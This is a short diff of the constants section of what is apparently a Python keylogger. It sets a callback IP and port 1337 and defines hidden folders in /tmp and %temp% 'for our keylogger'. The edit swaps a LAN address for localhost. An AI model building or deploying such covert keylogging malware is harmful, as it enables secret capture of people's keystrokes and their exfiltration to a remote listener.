@@ -24,7 +24,7 @@ except ImportError as e:
 #  CONSTANTS  #
 FILENAME = __file__[2:] # The name of this file.
 SYSTEM = system() # The operating this program is being ran on.
-IP = '192.168.31.134' # IP address to connect to.
+IP = '127.0.0.1' # IP address to connect to. Change this to your IP address!
 PORT = 1337 # Port number to create socket with.
 LIN_DIR = '/tmp/.folder/' # Hidden Linux folder to create for our keylogger.
 WIN_DIR = r'%temp%\.folder' # Hideen Windows folder to create for our keylogger.
